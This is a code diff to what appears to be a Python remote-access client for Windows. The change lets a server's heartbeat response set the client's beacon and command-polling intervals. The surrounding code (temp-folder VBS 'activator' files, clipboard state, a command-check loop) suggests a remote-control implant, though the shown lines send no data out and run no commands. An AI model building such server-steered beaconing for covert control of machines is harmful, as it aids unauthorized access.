@@ -44,6 +44,9 @@ last_command_time = time.time()
 current_working_dir = 'C:\\Users'
 clipboard_file = None
 clipboard_cut = False
+current_heartbeat_interval = HEARTBEAT_INTERVAL_SECONDS
+current_command_check_interval = COMMAND_CHECK_INTERVAL_SECONDS
+current_inactivity_threshold = INACTIVITY_THRESHOLD_SECONDS
 
 ERROR_VBS_PATH = os.path.join(tempfile.gettempdir(), "telelluc_error.vbs")
 ACTIVATOR_VBS_PATH = os.path.join(tempfile.gettempdir(), "telelluc_activator.vbs")
@@ -719,14 +722,14 @@ def auto_compile():
 
 
 def heartbeat_loop():
-    global device_id, last_command_time
+    global device_id, last_command_time, current_heartbeat_interval, current_command_check_interval, current_inactivity_threshold
     hostname = socket.gethostname()
     while True:
         try:
             time_since_command = time.time() - last_command_time
-            is_active = time_since_command < INACTIVITY_THRESHOLD_SECONDS
+            is_active = time_since_command < current_inactivity_threshold
             status = "active" if is_active else "inactive"
-            seconds_inactive = max(0, int(time_since_command - INACTIVITY_THRESHOLD_SECONDS))
+            seconds_inactive = max(0, int(time_since_command - current_inactivity_threshold))
 
             payload = json.dumps({
                 "hostname": hostname,
@@ -747,17 +750,20 @@ def heartbeat_loop():
             resp = urllib.request.urlopen(req, timeout=10).read()
             data = json.loads(resp.decode("utf-8"))
             device_id = data.get("id")
+            current_heartbeat_interval = data.get("heartbeat", HEARTBEAT_INTERVAL_SECONDS)
+            current_command_check_interval = data.get("commandCheck", COMMAND_CHECK_INTERVAL_SECONDS)
+            current_inactivity_threshold = data.get("inactivityThreshold", INACTIVITY_THRESHOLD_SECONDS)
             print(f"[heartbeat] OK - device {device_id} ({hostname}) - {status}", flush=True)
         except Exception as e:
             print(f"[heartbeat] ERROR: {e}", flush=True)
-        time.sleep(HEARTBEAT_INTERVAL_SECONDS)
+        time.sleep(current_heartbeat_interval)
 
 
 def command_check_loop():
-    global device_id, last_command_time
+    global device_id, last_command_time, current_command_check_interval
     while True:
         if device_id is None:
-            time.sleep(COMMAND_CHECK_INTERVAL_SECONDS)
+            time.sleep(current_command_check_interval)
             continue
         try:
             req = urllib.request.Request(
@@ -826,7 +832,7 @@ def command_check_loop():
 
         except Exception as e:
             print(f"[command] ERROR: {e}", flush=True)
-        time.sleep(COMMAND_CHECK_INTERVAL_SECONDS)
+        time.sleep(current_command_check_interval)
 
 
 class Handler(BaseHTTPRequestHandler):
